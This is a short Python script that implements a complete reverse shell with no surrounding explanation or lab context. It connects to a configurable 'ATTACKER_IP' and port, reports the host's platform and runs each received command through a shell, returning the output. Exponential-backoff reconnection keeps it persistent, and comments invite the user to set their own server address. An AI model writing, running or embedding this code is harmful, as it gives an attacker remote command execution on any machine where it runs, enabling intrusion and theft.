import socket
import subprocess
import time
import sys
import platform

def reverse_shell(attacker_ip, attacker_port):
    retry_delay = 1

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            retry_delay = 1

            # Send OS info immediately after connection
            os_info = platform.platform()
            s.send(os_info.encode())

            while True:
                cmd = s.recv(4096).decode()
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    s.close()
                    sys.exit(0)

                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Command execution failed: {e}"

                if not output:
                    output = "[No output]\n"
                s.send(output.encode())

            s.close()

        except Exception:
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 60)

if __name__ == "__main__":
    ATTACKER_IP = "192.168.1.68"  # Change to your server's IP
    ATTACKER_PORT = 4433           # Change to your server's port

    reverse_shell(ATTACKER_IP, ATTACKER_PORT)
